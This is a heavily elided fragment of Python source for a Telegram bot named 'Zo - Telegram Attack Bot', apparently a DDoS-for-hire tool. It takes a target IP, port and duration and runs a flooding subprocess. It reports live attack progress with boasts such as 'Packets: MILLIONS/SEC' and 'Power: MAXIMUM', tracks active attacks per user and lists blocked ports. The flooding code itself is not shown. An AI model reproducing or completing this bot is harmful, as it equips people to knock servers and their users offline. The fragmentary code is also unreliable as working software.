#!/usr/bin/env python3
# Zo - Telegram Attack Bot for Zeta Realm (FULL EMOJIS + ALL COMMANDS WORKING)
...
def run_attack(ip, port, duration, user_id, chat_id, message_id):
    ...
    while proc.poll() is None:
        ...
        if time.time() - last_update > 2:
            ...
            text = f"""{EMOJI['boom']}{EMOJI['fire']}{EMOJI['skull']} ATTACK LIVE {EMOJI['skull']}{EMOJI['fire']}{EMOJI['boom']}
...
{EMOJI['lightning']} Packets: MILLIONS/SEC"""
    ...
    edit_message(chat_id, message_id, f"""{EMOJI['check']}{EMOJI['check']} ATTACK COMPLETED {EMOJI['check']}{EMOJI['check']}
...
def handle_status(chat_id, user_id):
    ...
    with attack_lock:
        if not active_attacks:
            ...
            return
        lines = [f"{EMOJI['fire']}{EMOJI['fire']} ACTIVE ATTACKS {EMOJI['fire']}{EMOJI['fire']}"]
        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        for uid, info in active_attacks.items():
            ...
            lines.append(f"{EMOJI['bolt']} Power: MAXIMUM")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━")
...
{EMOJI['info']} Blocked ports: 8700, 20000, 443, 17500, 9031, 20002, 20001""")
        return
    msg_id = send_message(chat_id, f"""{EMOJI['rocket']}{EMOJI['rocket']} PREPARING ATTACK {EMOJI['rocket']}{EMOJI['rocket']}
